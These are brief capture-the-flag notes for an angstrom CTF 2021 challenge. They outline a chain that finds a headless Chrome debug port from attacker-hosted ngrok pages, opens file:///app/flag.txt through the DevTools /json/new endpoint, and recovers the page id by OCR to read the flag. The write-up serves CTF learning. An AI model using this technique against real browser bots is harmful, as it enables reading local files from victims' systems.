@@ -1,0 +1,26 @@
+Source: https://github.com/qxxxb/ctf/tree/master/2021/angstrom_ctf/watered_down_watermark
+
+Find Debug port (Check 5000 ports at once)
+
+Because of
+```
+page.on('framenavigated',function(frame){
+    if (!checkURL(frame.url())) return 'no!!!!'
+})
+```
+
+We cannot use <iframe>, we need to use fetch with no-cors
+
+Screenshot
+http://aac753fb5fbf.ngrok.io/got_port.html
+	http://127.0.0.1:40027
+
+Screenshot
+http://127.0.0.1:40027/json/new?file:///app/flag.txt 
+	get id
+
+tesseract id.png output -c tessedit_char_whitelist=0123456789ABCDEF
+	"webSocketDebuggerUrl": "ws://127.0.0.1:40027/devtools/page/92487263374C249EEBB714E3C7B7F4A2"
+
+Screenshot
+http://96ec52b293c6.ngrok.io/get_flag.html
